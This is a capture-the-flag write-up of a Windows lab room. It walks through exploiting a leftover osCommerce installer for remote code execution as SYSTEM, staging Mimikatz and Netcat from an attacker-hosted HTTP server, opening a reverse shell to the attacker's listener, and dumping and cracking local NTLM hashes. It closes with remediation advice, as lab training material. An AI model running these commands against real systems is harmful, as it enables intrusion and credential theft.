# Blueprint

**Platform:** TryHackMe
**Category:** Challenge Room (Windows)
**Difficulty:** Medium
**Status:** ✅ Solved (root flag captured; user Lab's NTLM hash dumped and cracked)

## Background

Blueprint is a Windows machine whose web stack was installed and then abandoned. An **osCommerce 2.3.4.1** shop runs on it, and osCommerce's most dangerous leftover is still in place: the **`/install` directory was never deleted** after setup. The installer's final step writes the values it is given into the application's `configure.php` file — including the database name — without sanitising them. An unauthenticated attacker who re-runs that final step can inject PHP code into the `db_database` parameter and have it written into a file the web server executes, turning a forgotten installer into remote code execution (Exploit-DB 50128). Because the web service runs with maximum privileges, the very first shell is already `NT AUTHORITY\SYSTEM` — no privilege escalation is needed at all. The room's second task is post-exploitation: use Mimikatz to dump the local SAM and crack the NTLM hash of the user **Lab**.

## Lab Objective

Break into the Windows target through the osCommerce installer RCE, capture the root flag as SYSTEM, then dump and crack the NTLM password hash of the user Lab with Mimikatz.

**Provided resources:** the target machine only; no credentials are given.

<img width="2688" height="934" alt="step-1" src="https://github.com/user-attachments/assets/e91eab8b-9d13-4abc-9fa2-b1a043d5976c" />

<img width="3159" height="1330" alt="step-2" src="https://github.com/user-attachments/assets/d85ebd83-cf2c-4d92-8557-d01c844b0d10" />

## Walkthrough

### Step 1: Scan the Target

Run an aggressive Nmap scan:

```bash
nmap -A -Pn 10.48.136.10
```

Several ports are open, and two different web servers answer:

| Port | Service | Detail |
|---|---|---|
| 80/tcp | HTTP | Microsoft IIS 7.5 — returns 404, "File or directory not found" |
| 135/tcp | MS-RPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS-SSN | — |
| 443/tcp | HTTPS | Apache httpd 2.4.23 (Win32), PHP 5.6.28 — directory listing ("Index of /") enabled |
| 8080/tcp | HTTP | The Apache site, holding the shop and its documents |

Start with the web ports — 80 first, then 8080.

<img width="2598" height="1420" alt="step-3" src="https://github.com/user-attachments/assets/52f3ec6c-e8ae-43df-9348-4828a086a783" />

<img width="2829" height="1365" alt="step-4" src="https://github.com/user-attachments/assets/c150acfc-4565-40a0-8e9e-4fc377c65310" />

### Step 2: Recon the Web Servers — IIS Is a Dead End, Apache Is Not

Port 80 (IIS) has nothing: a plain 404 for the root. The Apache site on 8080 is the real surface. It exposes two entries worth exploring — a **catalog** (the shop itself) and a **docs** folder — and the Nmap output had already hinted at the same content.

<img width="1936" height="516" alt="step-5" src="https://github.com/user-attachments/assets/c4f498f7-eafd-4e00-947a-d36273c9c128" />

<img width="1862" height="708" alt="step-6" src="https://github.com/user-attachments/assets/a48b53e5-9f30-44d6-b56a-a875a6432c6d" />

<img width="2009" height="595" alt="step-7" src="https://github.com/user-attachments/assets/74db82e8-d4b2-4573-97cd-feb3e25fb205" />

### Step 3: Read the Public Documentation

Inside `docs` there are PDF files and a folder, all publicly readable. Two documents matter:

- **`Database_schema.pdf`** — the shop's database layout.
- **The documentation PDF** — a large manual that names the platform behind the shop: **osCommerce**, with a link to the project.

Publishing your own database schema and product documentation on the target itself is information disclosure that tells an attacker exactly what to research.

<img width="1727" height="985" alt="step-8" src="https://github.com/user-attachments/assets/7bdafde6-4cbf-4efb-9aa3-3f17d058f847" />

<img width="2496" height="1442" alt="step-9" src="https://github.com/user-attachments/assets/93bd4a81-86a0-4bcb-b4a0-e558e59481bd" />

<img width="2538" height="1202" alt="step-10" src="https://github.com/user-attachments/assets/8dde894e-6e1c-4a16-8f0e-030923c66a68" />

<img width="1887" height="674" alt="step-11" src="https://github.com/user-attachments/assets/47b936c0-e662-48de-86ad-75126cba6412" />

### Step 4: Research osCommerce 2.3 Vulnerabilities

With the product and version line identified (osCommerce 2.3.x), research its known vulnerabilities. Several exist; the plan is to prefer a **remote code execution** flaw and keep SQL injection as the fallback if RCE does not work out.

<img width="2724" height="1409" alt="step-12" src="https://github.com/user-attachments/assets/2f32a0ec-7570-465d-a6d3-37c83ed3f682" />

<img width="2010" height="682" alt="step-13" src="https://github.com/user-attachments/assets/bed11b9c-c294-4ef8-a72b-8764611992f9" />

<img width="1917" height="708" alt="step-14" src="https://github.com/user-attachments/assets/a5ae3c57-9ec1-4012-9549-a88e82bc25a8" />

### Step 5: Check the Shop Itself

Opening the **catalog** shows a working osCommerce storefront. One quirk stands out immediately: clicking any link or button in the shop redirects to **localhost** — the shop's configured base URL points at itself, a leftover of careless installation. The storefront is half-broken, which suggests the whole install was never finished properly. That raises a specific suspicion: was the installer ever removed?

<img width="2829" height="1634" alt="step-15" src="https://github.com/user-attachments/assets/a02b1fc8-0099-4c0c-a685-e8ce2bfadb95" />

<img width="2415" height="1129" alt="step-16" src="https://github.com/user-attachments/assets/6ed029fb-ab44-4e4d-b7fa-6f7cc24aa542" />

### Step 6: The Installer Is Still There — and Its Steps Can Be Skipped

Further research confirms the angle: on osCommerce installs where the `/install` directory survives, `install.php` remains reachable. Browse to it:

```text
http://10.48.136.10:8080/install/install.php
```

The installation wizard loads. Walking it honestly does not work — it demands a valid database username part-way through its four steps. But the wizard trusts the step parameter in the URL: editing the URL jumps **directly to step 4**, the finish step, skipping the checks entirely. That is the vulnerability — the final step will accept database settings from anyone and write them into the site's configuration file.

<img width="1997" height="1388" alt="step-17" src="https://github.com/user-attachments/assets/7283c5b5-eb3b-4a2c-9d02-821e90a8290f" />

<img width="2745" height="1615" alt="step-18" src="https://github.com/user-attachments/assets/5e442522-914c-4334-9fc0-000bc1c52ae2" />

<img width="2775" height="1122" alt="step-19" src="https://github.com/user-attachments/assets/becf4385-11c1-42bd-aee4-b378dfc18770" />

### Step 7: Run the Public Exploit (Exploit-DB 50128)

Exploit-DB carries a ready-made exploit for exactly this flaw: **EDB-ID 50128, "osCommerce 2.3.4.1 - Remote Code Execution (2)"**. Its own header describes the mechanism — injecting a PHP payload into the `db_database` parameter during the `install.php` finish process, then reading the command output from `configure.php` — and notes that no authentication is needed. Download it.

<img width="3512" height="1721" alt="step-20" src="https://github.com/user-attachments/assets/0d34b44e-bb74-4f92-bec0-bd84b3556d47" />

Running it bare first prints its expected usage format; then run it against the shop's URL:

```bash
python3 50128.py http://10.48.136.10:8080/install/install.php
```

It works — a web shell answers with command execution on the Windows host.

<img width="2511" height="429" alt="step-21" src="https://github.com/user-attachments/assets/3861c771-4513-41a1-b2ab-71ea0e7cc8bb" />

<img width="2632" height="503" alt="step-22" src="https://github.com/user-attachments/assets/1621ad49-f76e-401c-9802-55ff5cd08e27" />

### Step 8: SYSTEM Shell and the Root Flag

Check the identity of the shell:

```cmd
whoami
```

**`nt authority\system`** — the web service runs as SYSTEM, so the first shell is already the highest privilege on the box. There is no privilege escalation phase in this room at all.

<img width="2601" height="582" alt="step-23" src="https://github.com/user-attachments/assets/5125a895-6e20-433a-8292-101134b30d55" />

Enumerate the working directory and the web root to get oriented:

<img width="2543" height="970" alt="step-24" src="https://github.com/user-attachments/assets/0894b614-df49-4df9-99e2-2bff234a818d" />

Now locate the flag. Rather than browsing folder by folder through the web shell, search the whole drive by filename in one command:

```cmd
dir C:\ /s /b | findstr /i /c:"root.txt"
```

`/s` recurses through every subdirectory, `/b` prints bare paths only, and `findstr` filters the output for the filename. The search finds `root.txt`.

<img width="1934" height="740" alt="step-25" src="https://github.com/user-attachments/assets/8a6eb106-0114-4a54-a265-d12f63bdcfe3" />

<img width="1874" height="201" alt="step-26" src="https://github.com/user-attachments/assets/ec27295f-3699-4253-a4fd-baee157c9dbc" />

Read it — the room's root flag.

<img width="2099" height="260" alt="step-27" src="https://github.com/user-attachments/assets/79b9bcc5-0d2a-41e5-819d-e3e777178a98" />

### Step 9: Dump Lab's NTLM Hash with Mimikatz

The remaining task: find the **NTLM hash of the user Lab** and crack it. That means running **Mimikatz** on the target — which first means getting tooling onto the box through the web shell. The pattern used here is reusable for any tool:

1. On Kali, locate `mimikatz.exe`, place it in a staging folder, and serve that folder over HTTP:

```bash
python3 -m http.server 8000
```

<img width="2740" height="937" alt="step-28" src="https://github.com/user-attachments/assets/06c73db8-4474-4ae5-95ec-5f000bd60c54" />

<img width="2095" height="328" alt="step-29" src="https://github.com/user-attachments/assets/d95fcab5-f674-4729-9a53-2ce74d71dbce" />

2. From the web shell on the target, download Mimikatz from the Kali server. The upload lands on the target.

<img width="2813" height="487" alt="step-30" src="https://github.com/user-attachments/assets/1c7a9b08-10be-400d-ae4a-a9187daa9d87" />

3. A web shell is a poor place to run an interactive tool, so stage a better shell the same way: find `nc.exe` on Kali, copy it into the staging folder, and download it to the target as well.

<img width="2134" height="839" alt="step-31" src="https://github.com/user-attachments/assets/56c581cc-9867-4484-8611-19a736b2b267" />

<img width="2631" height="386" alt="step-32" src="https://github.com/user-attachments/assets/715fb1e0-27aa-4504-a9a6-e53bd9cfab92" />

4. Set a Netcat listener on Kali:

```bash
nc -nlvp 4444
```

<img width="1331" height="356" alt="step-33" src="https://github.com/user-attachments/assets/af83b589-aaa0-4d5d-8673-cc1434d24385" />

5. On the target, run `nc.exe` back to the listener:

```cmd
nc.exe <kali-ip> 4444 -e cmd.exe
```

<img width="1742" height="262" alt="step-34" src="https://github.com/user-attachments/assets/90b4d73e-6f4d-4fa2-acba-d04c249f836e" />

The listener catches a proper command shell — still SYSTEM, now comfortable enough for interactive work.

<img width="2048" height="651" alt="step-35" src="https://github.com/user-attachments/assets/592908bc-e66d-49f6-9c5e-786933308335" />

6. Run Mimikatz in that shell:

```cmd
mimikatz.exe
```

<img width="2122" height="682" alt="step-36" src="https://github.com/user-attachments/assets/92012c05-2863-4ab2-91e5-f111261492d2" />

Enable debug privilege first — Mimikatz needs it to read the SAM:

```text
privilege::debug
```

It answers **Privilege '20' OK**.

<img width="1459" height="647" alt="step-37" src="https://github.com/user-attachments/assets/fd696272-8b3f-4390-917a-52706c6c9e4d" />

Dump the local account database:

```text
lsadump::sam
```

The SAM dump lists the local users with their hashes — including the **NTLM hash of the user Lab** (the hash value appears in the screenshot and is not repeated here).

<img width="2326" height="1075" alt="step-38" src="https://github.com/user-attachments/assets/319d0978-8b5a-4076-8b92-3b5b854bdf8b" />

7. Crack the hash offline on Kali with a standard NTLM attack (Hashcat mode 1000 or John) against a wordlist. The password falls — a weak, dictionary-grade secret (shown in the screenshot, not repeated here).

<img width="2686" height="850" alt="step-39" src="https://github.com/user-attachments/assets/dcab6255-5fa9-444d-9a5c-15cf03379655" />

## Key Takeaways

- Delete the installer. osCommerce's own documentation says to remove `/install` after setup; leaving it turned a finished shop into an unauthenticated RCE, because the installer's finish step writes attacker-controlled input into an executable PHP configuration file.
- A wizard that trusts a step parameter is not a wizard — skipping straight to step 4 bypassed every validation the earlier steps were supposed to enforce. Server-side state must be verified at every step, never inferred from the URL.
- The web service ran as SYSTEM, collapsing the entire attack: initial access *was* full compromise. Web services should run under dedicated low-privilege accounts precisely so that a web RCE is a foothold, not the end.
- The tool-staging workflow is the practical skill of this room: serve tools from Kali over HTTP, pull them down through whatever shell you have, upgrade a web shell to a real shell with `nc.exe`, and only then run interactive tooling like Mimikatz (`privilege::debug` → `lsadump::sam`).
- NTLM hashes are fast, unsalted MD4 — any password weak enough to sit in a wordlist falls almost instantly once the SAM is dumped. Strong passphrases are the only defence at that point.

## Remediation

Remove installation directories from every production web application and block access to setup paths at the web server. Keep osCommerce (or its successor) patched, and never expose product documentation or database schemas on the production host. Run web services under dedicated least-privilege service accounts — never SYSTEM or root — so a web-layer RCE cannot immediately become full host compromise. Restrict outbound and lateral tooling paths where possible, monitor for credential-dumping behaviour (SAM access and debug-privilege use are exactly what EDR tooling exists to catch), and enforce long, unique passwords for local accounts so that a dumped NTLM hash is not a cracked password.
